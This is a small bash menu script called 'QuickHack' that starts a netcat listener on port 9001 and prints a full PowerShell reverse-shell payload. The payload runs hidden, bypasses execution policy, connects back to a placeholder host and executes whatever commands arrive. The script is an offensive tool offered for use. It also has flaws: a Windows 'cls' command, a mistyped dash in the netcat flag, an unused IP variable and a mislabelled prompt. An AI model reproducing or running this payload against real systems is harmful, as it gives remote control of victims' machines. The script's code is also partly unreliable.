cls
ip=`ifconfig|xargs|awk '{print $7}'|sed -e 's/[a-z]*:/''/'`
base64 -d <<<"ICAoKCAgICAoICAgICAoICAoICAgKCAoICAgKCAgICggICggICAKICApKVwgICApXCAgKCAoXCApXCAgKVwpXDogKVwgIChcIClcICAKICgoXykpICgoXykgKVwoXCgoXykoXykoXykoXygpIChcKChfKSAKKC8gXyBcKChfKSkoXykoICkgfF9fIHx8IHwoXykoKSggKSB8X18KfCAoXykgfCB8fCB8IHwgX3wgLyAvIF9fIHwgX2AgfCBffCAvIC8KIFxfX1xfXFxfLl98X3xfX3xfXF9cX3x8X3xfXy9ffF9ffF9cX1wK"
PS3='linux@QuickHack '
options=("Setup Listner" "Reverse Shell Generator" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Setup Listner")
            netcat –lvnp 9001
            ;;
        "Reverse Shell Generator")
            clear
            echo powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('yourip', 9001);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
            echo change the ip adress in the payload
            read -p "Press [Enter] key to start backup..."
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
